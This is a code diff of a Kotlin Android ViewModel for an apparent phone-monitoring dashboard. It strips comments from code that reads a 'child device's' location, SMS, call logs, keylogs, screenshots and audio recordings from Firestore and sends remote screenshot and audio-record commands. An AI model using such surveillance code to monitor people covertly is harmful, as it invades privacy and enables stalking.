@@ -11,21 +11,15 @@ import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import java.util.*
 
-/**
- * ViewModel that manages communication with Firebase for monitoring data
- */
 class MonitoringViewModel : ViewModel() {
     companion object {
         private const val TAG = "MonitoringViewModel"
     }
     
-    // Firebase instance
     private val firestore = FirebaseFirestore.getInstance()
     
-    // Active listeners
     private val listeners = mutableListOf<ListenerRegistration>()
     
-    // Data collections
     private val _locations = MutableStateFlow<List<LocationData>>(emptyList())
     val locations: StateFlow<List<LocationData>> = _locations
     
@@ -51,11 +45,8 @@ class MonitoringViewModel : ViewModel() {
         subscribeToCollections()
     }
     
-    /**
-     * Sets up listeners for all Firestore collections
-     */
     private fun subscribeToCollections() {
-        // Listen for location updates
+        
         val locationListener = firestore.collection("locations")
             .orderBy("timestamp")
             .limit(100)
@@ -71,7 +62,6 @@ class MonitoringViewModel : ViewModel() {
             }
         listeners.add(locationListener)
         
-        // Listen for SMS messages
         val smsListener = firestore.collection("sms_messages")
             .orderBy("timestamp")
             .limit(100)
@@ -87,7 +77,6 @@ class MonitoringViewModel : ViewModel() {
             }
         listeners.add(smsListener)
         
-        // Listen for call logs
         val callListener = firestore.collection("call_logs")
             .orderBy("timestamp")
             .limit(100)
@@ -103,7 +92,6 @@ class MonitoringViewModel : ViewModel() {
             }
         listeners.add(callListener)
         
-        // Listen for keylogs
         val keylogListener = firestore.collection("keylogs")
             .orderBy("timestamp")
             .limit(100)
@@ -119,7 +107,6 @@ class MonitoringViewModel : ViewModel() {
             }
         listeners.add(keylogListener)
         
-        // Listen for screenshots
         val screenshotListener = firestore.collection("screenshots")
             .orderBy("timestamp")
             .limit(50)
@@ -135,7 +122,6 @@ class MonitoringViewModel : ViewModel() {
             }
         listeners.add(screenshotListener)
         
-        // Listen for audio recordings
         val audioListener = firestore.collection("audio_recordings")
             .orderBy("timestamp")
             .limit(50)
@@ -151,7 +137,6 @@ class MonitoringViewModel : ViewModel() {
             }
         listeners.add(audioListener)
         
-        // Listen for device status updates
         val statusListener = firestore.collection("device_status")
             .orderBy("lastConnectionTime")
             .limit(1)
@@ -168,20 +153,13 @@ class MonitoringViewModel : ViewModel() {
         listeners.add(statusListener)
     }
     
-    /**
-     * Refresh all data by re-querying Firestore
-     */
     fun refreshAllData() {
-        // For simplicity, we'll just unsubscribe and resubscribe
-        // In a real app, you might want to refresh collections individually
+        
         unsubscribeFromCollections()
         subscribeToCollections()
         Log.d(TAG, "Refreshed all data collections")
     }
     
-    /**
-     * Send a command to take a screenshot
-     */
     fun requestScreenshot() {
         val command = hashMapOf(
             "command" to "SCREENSHOT",
@@ -193,9 +171,6 @@ class MonitoringViewModel : ViewModel() {
         sendCommand(command)
     }
     
-    /**
-     * Send a command to start audio recording
-     */
     fun requestAudioRecording(durationSeconds: Int = 60) {
         val command = hashMapOf(
             "command" to "AUDIO_RECORD",
@@ -209,9 +184,6 @@ class MonitoringViewModel : ViewModel() {
         sendCommand(command)
     }
     
-    /**
-     * Send a command to update location
-     */
     fun requestLocationUpdate() {
         val command = hashMapOf(
             "command" to "LOCATION_UPDATE",
@@ -223,9 +195,6 @@ class MonitoringViewModel : ViewModel() {
         sendCommand(command)
     }
     
-    /**
-     * Sends a command to the child device
-     */
     private fun sendCommand(command: Map<String, Any>) {
         firestore.collection("remote_commands")
             .add(command)
@@ -237,23 +206,15 @@ class MonitoringViewModel : ViewModel() {
             }
     }
     
-    /**
-     * Clean up listeners when ViewModel is cleared
-     */
     override fun onCleared() {
         super.onCleared()
         unsubscribeFromCollections()
     }
     
-    /**
-     * Removes all Firestore listeners
-     */
     private fun unsubscribeFromCollections() {
         listeners.forEach { it.remove() }
         listeners.clear()
     }
-    
-    // Mapping functions to convert Firestore documents to data models
     
     private fun documentToLocation(document: DocumentSnapshot): LocationData? {
         return try {
